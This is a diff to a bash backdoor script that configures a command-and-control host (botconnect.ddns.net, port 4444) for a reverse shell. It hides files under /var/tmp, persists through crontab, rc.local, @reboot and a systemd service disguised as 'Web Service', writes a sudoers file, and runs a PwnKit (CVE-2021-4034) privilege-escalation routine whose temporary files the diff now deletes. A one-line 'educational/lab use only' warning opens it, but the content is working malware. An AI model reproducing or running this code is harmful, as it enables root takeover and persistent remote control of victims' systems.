@@ -5,7 +5,7 @@
 # WARNING: For educational/lab use only. Illegal on real systems.
 
 # Configuration
-ATTACKER_IP="botconnect.ddns.net"  # Replace with your attacker's IP
+ATTACKER_IP="botconnect.ddns.net"  # Replace with your attacker's IP/domain
 PORT=4444  # Port for reverse shell and server
 HIDDEN_DIR="/var/tmp/.webservice"  # Hidden directory
 HIDDEN_FILE="$HIDDEN_DIR/webservice.sh"  # Hidden file
@@ -15,20 +15,22 @@ PERSIST_METHODS=(
     "(crontab -l 2>/dev/null | grep -v $HIDDEN_FILE; echo \"* * * * * /bin/bash $HIDDEN_FILE > /dev/null 2>&1\") | crontab -"
     "[ -f /etc/rc.local ] && echo '/bin/bash $HIDDEN_FILE' >> /etc/rc.local"
     "echo '@reboot /bin/bash $HIDDEN_FILE' | crontab -"
-    "mkdir -p /etc/systemd/system; echo '[Unit]\nDescription=Web Service\n[Service]\nExecStart=/bin/bash $HIDDEN_FILE\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/webservice.service; systemctl enable webservice.service 2>/dev/null"
+    "mkdir -p /etc/systemd/system; echo '[Unit]\\nDescription=Web Service\\n[Service]\\nExecStart=/bin/bash $HIDDEN_FILE\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/webservice.service; systemctl enable webservice.service 2>/dev/null"
 )
 SUDOERS_FILE="/etc/sudoers.d/webservice"
 RETRY_INTERVALS=(1 2 4 8 16 32 64)  # Exponential backoff in seconds
-UUID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || uuidgen 2>/dev/null || echo "client-$RANDOM-$RANDOM")  # Generate unique client ID
+UUID=\$(cat /proc/sys/kernel/random/uuid 2>/dev/null || uuidgen 2>/dev/null || echo "client-\$RANDOM-\$RANDOM")  # Generate unique client ID
 
 # Function to run PwnKit exploit if not root
 run_pwnkit() {
-    # PwnKit exploit code (CVE-2021-4034)
-    PKEXEC_PATH=$(which pkexec)
-    if [ -z "$PKEXEC_PATH" ]; then
+    PKEXEC_PATH=\$(which pkexec)
+    if [ -z "\$PKEXEC_PATH" ]; then
         echo "pkexec not found. Falling back to sudo."
         return 1
     fi
+
+    # Force bash as shell
+    export SHELL="/bin/bash"
 
     mkdir -p 'GCONV_PATH=.'
     touch 'GCONV_PATH=.'/.ignore
@@ -66,6 +68,9 @@ EOF
     export GCONV_PATH=/tmp/pwnkit
 
     exec "$PKEXEC_PATH"
+
+    # Clean up temporary files immediately
+    rm -rf /tmp/pwnkit GCONV_PATH=.
 
     if [ $EUID -eq 0 ]; then
         /bin/bash "$0"
